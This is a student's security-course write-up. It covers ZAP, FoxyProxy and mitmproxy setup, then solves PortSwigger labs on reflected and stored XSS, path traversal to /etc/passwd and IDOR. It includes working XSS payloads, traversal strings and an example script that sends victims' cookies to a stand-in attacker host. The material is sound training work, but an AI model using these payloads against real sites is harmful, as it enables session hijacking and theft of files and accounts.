 # X) Read/Watch/Listen & Summarize

**Objective**
- A few bullet points per section is enough to summarize
- Add your own observation, question or idea


## X.1) [OWASP A01:2021](<https://owasp.org/Top10/2021/A01_2021-Broken_Access_Control/index.html>) - Broken Access Control
**Common access control vulnerabilities:**
- Violation of the principle of least privilege
- Bypassing access control checks with URL tampering
- Insecure direct object references
- Abusing JWT
- CORS misconfiguration


## X.2) PortSwigger Academy
[IDOR](<https://portswigger.net/web-security/access-control/idor>)
- a.k.a Insecure Direct Object References
- A vulnerability that arises from accessing objects directly with user-supplied input
- Most commonly associated with horizontal privilege escalation
 

[Path Traversal](<https://portswigger.net/web-security/file-path-traversal>)
- This type of vulnerability arises when a web server retrieves _files_ based on a _filename_ **appended** to a **base file path**
- Say a web server is serving content from `/home/webUser/content/*`, this is the base file path!
- If no controls are in place, one could read files from the home directory by tampering with the URL and replacing allowed file, say `file1`, with `../secretFile.txt`
  - Simply put: `/home/webUser/content/file1` now becomes `/home/webUser/secretFile`


[Cross-site scripting (XSS)](<https://portswigger.net/web-security/cross-site-scripting>)
- This vulnerability allows an attacker to inject malicious scripts into a trusted site, causing the victim’s browser to execute them as if they were legit. Leading to the attacker gaining the same access rights as the victim user.
3 main types:
1. Reflected XSS
   - The malicious script comes from the current HTTP request
3. Stored XSS
   - The malicious script comes from a website's database
   - The data is then included in later HTTP responses
5. DOM-based XSS
   - The vulnerability exists in client-side code, rather than server-side

How to prevent
- Filter user input as strictly as possible
- Encode user-controllable data in HTTP responses
- Use appropriate response headers suchs as `Content-Type` and `X-Content-Type-Options` to ensure browsers interpret responses as intended
- Content Security Policy (CSP) to reduce severity of any XSS vulnerability that still occur






------







# A) Totally Legit Certificate
**Objective**
- Install OWASP ZAP
- Generate a CA-certificate and install it on your browser
- Set ZAP as a proxy in your browser
- Set ZAP to capture also pictures
- Show that the requests appear in the ZAP interface


## Zed Attack Proxy
What is ZAP?
- Free, open-source penetration testing tool
- Specifically for testing web applications
- [Source](<https://www.zaproxy.org/getting-started/>)

Install and start it on Kali:
```bash
$ sudo apt install zaproxy
$ zaproxy
```
From this point on there's two ways we can go about this. Because ZAP [generates](<https://www.zaproxy.org/docs/desktop/addons/network/options/servercertificates/#generate>) a Root CA certificate for us, we can either:
1. Use the cert automatically
or
2. Import the cert to our browser

The first option is perfect for quickly testing a website or for one-offs. We do this by launching the browser through ZAP like so:

<img width="1635" height="1086" alt="2026-04-16-23:30:43" src="https://github.com/user-attachments/assets/13f686e1-11c5-4191-9d6d-67da36ef3af8" />


In order to capture pictures, one must: --> `Ctrl+Alt+O` --> type "display" in the search bar --> select the option --> check the selection on "Process images in HTTP requests/responses".


Back on the ZAP interface we can see all the requests and replies:

<img width="1911" height="1129" alt="2026-04-17-17:19:36" src="https://github.com/user-attachments/assets/2b1233fe-4107-49f5-a330-79ed6626d978" />


The second method you're going to see next!




-------






# B) FoxyProxy
**Objective**
- Install FoxyProxy standard
- Add ZAP as a proxy to it

## Setting up
Open up the extensions-manager in your browser, search for "foxyproxy standard" and lastly add it to firefox.

**Q:** What is FoxyProxy?

**A:** A proxy manager, especially useful when you have multiple proxies


Because we want foxyproxy to manage what gets proxied and where, we're now going use the second method of setting up ZAP:

In ZAP:
 - `Ctrl+Alt+O` --> `Network` --> `Server Certificates` --> then click `save` and specify where to save it
 - This will export the Root CA certificate locally

In Firefox:
 - Open `Settings` --> `Privacy & Security` --> `View Certificates` --> `Authorities` --> `Import` --> "Trust this CA to identify websites"
 - This will import the cert to your browser


Once we have that sorted we'll add the ZAP config to foxyproxy
<img width="1753" height="612" alt="2026-04-17-18:47:46" src="https://github.com/user-attachments/assets/c806a8ba-fa2a-463b-adad-30644d276991" />


We then pin the extension to our tab bar so that we can change settings on the go

<img width="481" height="592" alt="2026-04-17-19:09:33" src="https://github.com/user-attachments/assets/6b420978-3820-4800-b6c7-3d30acbd0af3" />

1. If we enable `ZAP`, everything gets proxied through => zaproxy
2. If we enable `Proxy by Patterns`, only portswigger.net and related domains goes through (for now)
3. If we disable it nothing will be proxied

Let's showcase quickly that it works.


### Exhibit A - ZAP is on
I browsed to `terokarvinen.com` and `archive.org` and we can see it in the output (not launching any spiders or attacks, just normal browsing)

<img width="1621" height="297" alt="2026-04-18-13:42:54" src="https://github.com/user-attachments/assets/72a5012a-3a8f-4f94-8c05-3e127e77dfcf" />


### Exhibit B - Proxy by pattern is on
**1. Browse to a random site**
<img width="591" height="370" alt="2026-04-18-13:48:16" src="https://github.com/user-attachments/assets/055b1749-741d-44ef-8490-6d0846287481" />

**2. Browse to target**
<img width="568" height="379" alt="2026-04-18-13:48:37" src="https://github.com/user-attachments/assets/41ae50dc-fc69-4957-8573-772f3cea7b8f" />

**3. Target matches the pattern and flows through to ZAP**
<img width="799" height="172" alt="2026-04-18-13:49:26" src="https://github.com/user-attachments/assets/5a58f78f-fd84-4f80-99ab-e35873036619" />


Let the timestamps serve as adequate proof that it works!








--------








# C) PortSwigger Labs: [Reflected XSS](<https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded>)
**Description**
- There's a simple reflected cross-site scripting vulnerability present in the **search functionality**

**Objective**
- Perform a cross-site scripting attack that calls the `alert` function


## Reflecting
We start by poking the search functionality with a very basic HTML (bold) tag:
```html
<b>test</b>
```
Which returns a bolded "test":

<img width="760" height="223" alt="2026-04-19-15:40:56" src="https://github.com/user-attachments/assets/5800f8fa-f743-4bbc-9a62-b5c4b7fd3a62" />


We now suspect the page is vulnerable to further exploits as the input is not handled correctly.

We exploit this by typing the following into the search field:
```html
<script>alert('gotcha')</script>
```
Press enter => script runs and we get the alert ->

<img width="604" height="231" alt="2026-04-19-15:43:41" src="https://github.com/user-attachments/assets/ce64f076-7419-4329-a15c-1b61705e367d" />

The URL looks like:
```url
https://0aa0002804585a3d810525d8002a00fe.web-security-academy.net/?search=%3Cscript%3Ealert(%27gothca%27)%3C%2Fscript%3E
```

Notice the last part:
```url
/?search=%3Cscript%3Ealert(%27gothca%27)%3C%2Fscript%3E
```
The browser is unsuspecting, as we're dealing with a trusted source, so it executes the code. 

Were a victim now to use this URL, the "payload" would execute in their browser.




--------






# D) PortSwigger Labs: [Stored XSS](<https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded>)
**Description**
- Lab contains a stored cross-site scripting vulnerability in the comment functionality

**Objective**
- Submit a comment that calls out the `alert` function when the blog post is viewed

## Storing Malicious Data
Recall that in `stored XSS` the malicious script can come from the website's own database. In this case the provided comment is not validated or encoded properly, so we can input almost anything we'd like and the website will store it as is in the database. Every time someone visits the blog post and the comments are loaded -> the script will run.

We type in the following:
```html
<script>alert('takeover')</script>
```
And post the comment.

Now every time that specific blog post is opened:

<img width="841" height="808" alt="2026-04-19-13:01:07" src="https://github.com/user-attachments/assets/627d2b60-0831-4cd7-9974-ab6b078cf24e" />


<img width="728" height="358" alt="2026-04-19-13:01:14" src="https://github.com/user-attachments/assets/cf11d6b9-2e32-4122-9a23-1d787d25e91f" />





--------




# E) xplain
**Objective**
- Explain how an attacker might benefit from XSS using an example


Let's build on the previous task and say a website is vulnerable to cross-site scripting, specifically the comment section. An attacker might exploit this by posting the following comment:
```html
<script>
  var img = new Image();
  img.src = 'http://cookiemonster.com/steal.php?cookie=' + encodeURIComponent(document.cookie);
</script>
```
This is a `Stored XSS attack`, as the malicious script is now stored in the websites database. When users visit the webpage where the **contaminated database record** is loaded -> the script is run, effectively stealing their cookie. This is active exfiltration, as the script grabs the cookie and physically sends it to an attackers server.

Depending on the extracted cookie, and attacker might be able to 
- Hijack the session (import the cookie into their own browser and send requests with it, impersonating the victim user)
- Access sensitive data


Source can be found [here](<https://eitca.org/cybersecurity/eitc-is-wapt-web-applications-penetration-testing/web-attacks-practice/http-attributes-cookie-stealing/examination-review-http-attributes-cookie-stealing/how-can-cross-site-scripting-xss-attacks-be-used-to-steal-cookies/>) (original example modified).





--------






# F) PortSwigger Labs: [Simple Path Traversal](<https://portswigger.net/web-security/file-path-traversal/lab-simple>)
**Description**
- Lab contains a path traversal vulnerability in the display of product images

**Objective**
- Retrieve contents of the `/etc/passwd` file


## Travelling
> [!NOTE]
> I added a new entry into `Proxy by Patterns` to include lab traffic:
> - `*web-security-academy.net*`

When we get to the website in the lab we're faced with a basic shopping site, so we start by poking around and open up a new entry.

We then navigate back to the ZAP interface and inspect the GET request.

We find the following:
```html
GET https://0a7800560313d02980ee44ae00d30027.web-security-academy.net/image?filename=7.jpg HTTP/1.1
```
The website is loading a picture (`7.jpg` to be exact) to go along with the product. The content is served from a directory (presumably holding images), which we can now try to escape.

We copy the original GET request and paste it to `Requester`, which allows us to modify the request at will.

<img width="1345" height="312" alt="2026-04-20-00:10:31" src="https://github.com/user-attachments/assets/1255fdf5-67d7-4589-8a52-5fdfd768743a" />




We craft a new GET request, this time with `filename=/etc/passwd` and press send.

The server returns with `400 Bad Request` "No such file". So we do `filename=../../../../../../../etc/passwd`, send again and get a response. In order to view the loot we change the setting `Body: Image` to `Body: Text`. 

<img width="1633" height="675" alt="2026-04-20-00:27:44" src="https://github.com/user-attachments/assets/fc6a4dfc-3950-4984-bcd5-01b13aaa04e4" />

And there we have the `passwd` file. 

**Q:** Why did we move up so many directories?

**A:** Because we don't know the directory structure, this was basically the quickest way to get to the root of the filesystem. Once it reaches the root, any redundant `../`  are ignored.
In the rare case the original file would've been more deeply nested than that, we would've just added a few more `../` and got to the root.


**Q:** Why did the attack work?

**A:** The website didn't sanitize/validate the filename, so the server basically read the filepath as is and did exactly as told.

<img width="348" height="114" alt="2026-04-19-22:12:28" src="https://github.com/user-attachments/assets/dc987a73-e63a-40b3-ae5f-bd35a473db10" />






-----







# G) PortSwigger Labs: [Path Traversal 2](<https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass>)
**Description**
- Lab contains a path traversal vulnerability in the display of the product images
- The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory

**Objective**
- Retrieve contents of the `/etc/passwd` file



## Here we go again
We open up a new entry on the new website and go back to the ZAP interface to investigate.

Here's the response:

<img width="1248" height="816" alt="2026-04-20-00:47:36" src="https://github.com/user-attachments/assets/ddade0b3-1c9a-42c0-9690-3436e72f963c" />


So we tamper with the image filename again and send a new request. I tried the same tactic as last time, but got "No such file" in response. I just wanted to travel a little bit but my passport got flagged in customs... 😔 


Wandering through the filesystem is controlled, but we're able to loot the server by providing an absolute filepath instead:


<img width="1626" height="678" alt="2026-04-20-00:52:13" src="https://github.com/user-attachments/assets/278c2faa-0f2c-4472-b946-92be83f473fb" />


To my understanding: This works because the application assumes the requested file is relative to the working directory (while blocking traversal attempts). We **bypass** the whole relativity part by passing it an absolute filepath instead. 

The core problem: The application logic is not enforcing the final filepath staying within the intended `wd`.


<img width="225" height="74" alt="2026-04-20-01:03:08" src="https://github.com/user-attachments/assets/4ac787dd-a082-4bfd-ac59-e1d7f877426d" />








------








# H) PortSwigger Labs: [Non-recursive Path Traversal](<https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively>)
**Description**
- Lab contains a path traversal vulnerability in the display of the product images
- The application strips path traversal sequences from the user-supplied filename before using it

**Objective**
- Retrieve contents of the `/etc/passwd` file

## Travel ban?
<img width="1627" height="561" alt="2026-04-20-01:28:13" src="https://github.com/user-attachments/assets/50df64bb-0137-4215-bf83-5e7533ce795b" />

Let's turn that smile into something more useful!


The applications strips the sequences, sure, but how smart is it? What if we escape it's incomplete logic like so:

<img width="1627" height="715" alt="2026-04-20-01:35:03" src="https://github.com/user-attachments/assets/4db8a11a-c02c-4edc-87e3-e3dfde02c4d4" />



I suspect that the application is defending itself against path traversal attacks by simply removing occurences of the `../` sequence. We end up doing some simple math to circumvent this. Consider the following equation:

`....//` - `../` = `../` 


**Q:** Nice one! Now that you got that funny little analogy out of the way, what's actually going on?

**A:** Only accounting for `../` the application checks the string ones, removes only the inner sequence (the part that matches the simple pattern), unintentionally leaving behind a valid traversal sequence. This leads to us escaping the control mechanism in a relatively simple but elegant fashion.



<img width="225" height="74" alt="2026-04-20-01:03:08" src="https://github.com/user-attachments/assets/34fc284a-153a-44f3-a259-05cddf0321a3" />







------






# I) PortSwigger Labs: [IDOR](<https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references>)
**Description**
- Lab stores user chat logs directly on the server's file system, and retrieves them using static URLs


**Objective**
- Find the password for the user `carlos` and log into their account


## Never share your password with anyone
I skimmed through the offerings of the website and landed on a live chat page, as a feature you can download and view the transcript.

I pressed `View transcript` and it downloaded `2.txt` on my machine, containing the transcript of our long & deep conversation.

<img width="1798" height="694" alt="2026-04-20-02:21:05" src="https://github.com/user-attachments/assets/7e76b1a5-5183-4feb-9755-3cb35f100fbd" />

Back on the ZAP interface I hunted down the response:

<img width="481" height="252" alt="2026-04-20-02:20:18" src="https://github.com/user-attachments/assets/199e491a-4eed-4958-b11e-f274aaf7c99a" />

Which then led me to copy the URL of the request:

<img width="1281" height="159" alt="2026-04-20-02:20:45" src="https://github.com/user-attachments/assets/4d9fd554-7007-4e13-b2e1-e5ba01bc3c5f" />

From `2.txt` we can assume that there is a `1.txt` somewhere, so I appended it to the URL and recovered a previous conversation using curl:

<img width="1908" height="408" alt="2026-04-20-02:19:08" src="https://github.com/user-attachments/assets/b1d1348e-c345-4784-9215-6a7d568b5258" />


The hunch was correct and we were succesfully able to compromise Carlos account:

<img width="1176" height="673" alt="2026-04-20-02:21:43" src="https://github.com/user-attachments/assets/97b915be-9c42-49a3-9fa5-bccfd4b7e439" />


**Q:** What happened here really?

**A:** Recall from earlier that _Insecure Direct Object Reference (IDOR)_ is an _access control vulnerability_ that arises from accessing objects directly with user-supplied input. The application failed to properly authorize us, which we exploited by manipulating the URL to access resources belonging to other users, in this case poor Carlos.


<img width="225" height="74" alt="2026-04-20-01:03:08" src="https://github.com/user-attachments/assets/aa20cb97-dab7-414b-b13d-58675bcbc46d" />








---------








# J) Pencode
> Bonus task

**Objective**
- Install [pencode](<https://github.com/ffuf/pencode>)
- Encode a string with it



## Encoding
Pencode can be installed using `go`. If you don't have `go` installed the workflow might look something like this:
```sh
$ sudo apt update && sudo install golang-go
$ go install github.com/ffuf/pencode/cmd/pencode@latest
```

Then you can either add `~/go/bin` to your `$PATH` or manually invoke pencode: `~/go/bin/pencode`.

**Q:** What is `pencode`?

**A:** A tool for creating payload encoding chains. Designed for automation. Source: Repo README

Let's encode our first payload:

<img width="1045" height="258" alt="2026-04-20-03:04:52" src="https://github.com/user-attachments/assets/a4ebdf0d-9fae-4904-b765-9670fb2f587b" />

Invoke the program without params to get the help screen.







------









# K) Mitmproxy
> Bonus task

**Objective**
- Install Mitmproxy
- Showcase it in the terminal
- Enable TLS-decryption
- Pick a GET-request from the history, modify it, and resend it


## Man in the middle
Mitmproxy comes pre-installed on Kali. If you don't have it, navigate to the mitmproxy website and follow the instructions.

<img width="1140" height="183" alt="2026-04-20-04:04:02" src="https://github.com/user-attachments/assets/bfdce313-15a3-4399-bcaa-d409fe3879ac" />

If you haven't changed the config directory and run mitmproxy for the first time, it will create keys for the CA in `~/.mitmproxy/`, import the cert to your browser and you're good to go!


We already configured ZAP to use port 8080, it so happens that mitmproxy uses the same one, ZAP is not running, so from foxyproxy we can just enable ZAP and it will forward the traffic to mitmproxy.

We enable TLS decryption

Let's browse to `mitmproxy.org` and see the results

<img width="1911" height="1093" alt="2026-04-20-03:57:18" src="https://github.com/user-attachments/assets/816a0b1e-737e-440e-80fb-06a60e4e073c" />

We move around by using vim keys, delete entries with `d` and press enter to open up a record. Press `?` for help.






